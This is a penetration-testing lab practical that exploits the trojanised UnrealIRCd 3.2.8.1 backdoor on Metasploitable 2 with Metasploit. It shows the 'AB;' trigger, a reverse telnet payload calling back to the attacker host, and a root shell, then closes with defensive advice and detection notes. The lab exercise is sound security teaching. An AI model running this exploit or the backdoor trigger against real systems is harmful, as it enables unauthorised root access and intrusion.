# Practical 3: Hacking Linux OS using UnrealIRCd Backdoor

## Objective

In this practical we exploit the **UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)** present on Metasploitable 2 to gain a remote shell. Like the vsftpd backdoor, this is a real-world supply-chain incident — a malicious tarball was distributed from the official UnrealIRCd mirror between Nov 2009 and Jun 2010.

---

## Background on the Vulnerability

The trojanised UnrealIRCd binary executes any shell command following the magic string `AB;` received in the IRC handshake. Connect to port 6667, send `AB;<command>`, and the command runs as the IRCd user (often root on lab installs).

- **CVE:** CVE-2010-2075
- **CVSS v2:** 10.0
- **Metasploit module:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Target port:** TCP 6667 (IRC)

---

## Prerequisites

- Parrot/Kali with Metasploit, Metasploitable 2 target reachable.

```bash
sudo service postgresql start
msfconsole -q
```

---

## Step 1: Recon and Search

Confirm UnrealIRCd is running:

```bash
nmap -sV -p 6667 192.168.56.102
```

```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
```

Search and load:

```
msf6 > search unrealirc

   #  Name                                            Disclosure Date  Rank
   -  ----                                            ---------------  ----
   0  exploit/unix/irc/unreal_ircd_3281_backdoor      2010-06-12       excellent

msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6667
```

---

## Step 2: Select a Payload

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

   #  Name                            Description
   -  ----                            -----------
   0  cmd/unix/bind_perl              Bind TCP (Perl)
   1  cmd/unix/bind_ruby              Bind TCP (Ruby)
   2  cmd/unix/reverse                Reverse Telnet
   3  cmd/unix/reverse_perl           Reverse TCP (Perl)
   4  cmd/unix/reverse_ruby           Reverse TCP (Ruby)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
```

---

## Step 3: Verify Options

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4445
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
```

Expected: `RHOSTS=192.168.56.102`, `RPORT=6667`, `LHOST=192.168.56.101`, `LPORT=4445`.

---

## Step 4: Run the Exploit

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.56.101:4445
[*] 192.168.56.102:6667 - Connected to 192.168.56.102:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.56.102:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XYZ123ABC;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] Matching...
[*] Command shell session 1 opened (192.168.56.101:4445 -> 192.168.56.102:48235)
```

---

## Step 5: Run Linux Commands

```
id
uid=0(root) gid=0(root)

hostname
metasploitable

uname -a
Linux metasploitable 2.6.24-16-server i686 GNU/Linux

ls /home
ftp  msfadmin  service  user
```

---

## Defensive Recommendations

- **Verify integrity** of all downloaded source tarballs with PGP signatures and checksums published on a separate channel.
- **Run IRC daemons as a low-privileged user**, not root.
- **Restrict IRC ports** (6667, 6697) on the network perimeter; isolate chat services on their own VLAN.
- **Monitor for the `AB;` backdoor string** in IRC traffic; Snort/Suricata rules exist for this exact pattern.
- **Upgrade to UnrealIRCd 4.x or 5.x** — the 3.2.8.1 branch is abandoned.

---

## Disclaimer

For **educational purposes** only. Run only against systems you own or are authorised to test.
